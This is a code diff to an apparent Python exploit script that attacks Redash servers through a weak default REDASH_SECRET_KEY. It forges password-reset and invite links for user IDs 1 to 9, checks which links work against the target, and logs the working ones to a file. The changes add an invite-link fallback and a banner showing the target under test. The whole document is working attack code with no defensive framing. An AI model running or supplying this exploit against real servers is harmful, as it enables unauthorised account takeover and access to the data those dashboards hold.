@@ -24,14 +24,25 @@ def check_work(url2,id):
 	response = session.get(url2, headers=headers,verify=False, allow_redirects=False,timeout=5)
 	if response.status_code == 200:
 		if "Enter your new password" in response.text:
-			work = ("Rest Link "+url2+" - UserID: "+str(id)+"\n")
+			work = ("Reset Link "+url2+" - UserID: "+str(id)+"\n")
 			with open('working.txt', 'a+', encoding='UTF8', newline='') as f:
 				f.write(work)
 				f.close()
 				print(work)
 	else:
-		print(""+url2+"")
-		print("Failed to Generate Reset Link for "+str(id)+"\n")
+		url3 = url2.replace("reset","invite")
+		response2 = session.get(url3, headers=headers,verify=False,timeout=5)
+		if response2.status_code == 200:
+			print(""+url3+"")
+			with open('working.txt', 'a+', encoding='UTF8', newline='') as f:
+				work2 = ("Invite Link "+url3+" - UserID: "+str(id)+"\n")
+				f.write(work2)
+				f.close()
+		print("Failed to Generate Link for "+str(id)+"\n")
+		
+			
+			
+
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-s", "--secret", required=False ,default="c292a0a3aa32397cdb050e233733900f",help="Weak REDASH_SECRET_KEY")
@@ -61,7 +72,7 @@ def reset_link_for_user(user):
     return invite_url
 
 
-
+print ("[*] Testing: "+url+" [*]\n")
 for id in range(1,10):
 	url2 = reset_link_for_user(""+str(id)+"")
 	check_work(url2,id)
